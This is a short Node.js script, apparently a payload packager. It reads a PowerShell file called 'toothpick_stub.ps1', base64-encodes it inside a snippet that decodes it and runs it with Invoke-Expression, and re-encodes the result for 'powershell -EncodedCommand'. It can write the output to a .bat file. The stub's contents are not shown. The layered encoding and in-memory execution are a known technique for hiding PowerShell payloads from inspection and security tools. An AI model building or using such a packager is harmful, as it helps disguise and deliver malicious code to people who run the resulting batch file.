const fs = require("fs");
const path = require("path");
const { exec } = require("child_process");

// Read file toothpick_stub.ps1 and save content as base64
const ping = fs.readFileSync(
  path.join(__dirname, "toothpick_stub.ps1"),
  "utf8"
);
const encodedPing = Buffer.from(ping, "utf8").toString("base64");

// Create variable with PowerShell code with one empty variable that will contain the base64 encoded toothpick_stub.ps1 and execute it.
const encodedPingScript = `
    $encodedPing = '${encodedPing}';
    $decodedPing = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedPing));
    Invoke-Expression $decodedPing;
`;

// Encode the PowerShell code to UTF-16LE and then to base64
function utf8ToUtf16leBuffer(str) {
  const utf16leBuffer = Buffer.from(str, "utf16le");
  return utf16leBuffer;
}

const utf16leScript = utf8ToUtf16leBuffer(encodedPingScript);
const encodedPingScriptBase64 = Buffer.from(utf16leScript).toString("base64");

// Create the PowerShell command
const powershellCommand = `powershell -EncodedCommand ${encodedPingScriptBase64}`;

// Process command line arguments
const args = process.argv.slice(2);
const createBatFile = args.includes("-b");
const verbose = args.includes("-v");

// If -b flag is set, save the command as a .bat file
if (createBatFile) {
  const batFilePath = path.join(__dirname, "toothpick.bat");
  fs.writeFileSync(batFilePath, powershellCommand);
  if (verbose) {
    console.log(`Saved PowerShell command to ${batFilePath}`);
  }
} else if (verbose) {
  console.log("Generated PowerShell command:");
  console.log(powershellCommand);
} else {
  console.log(
    "You need to use the -b flag to create the .bat file or the -v flag to print the command."
  );
}
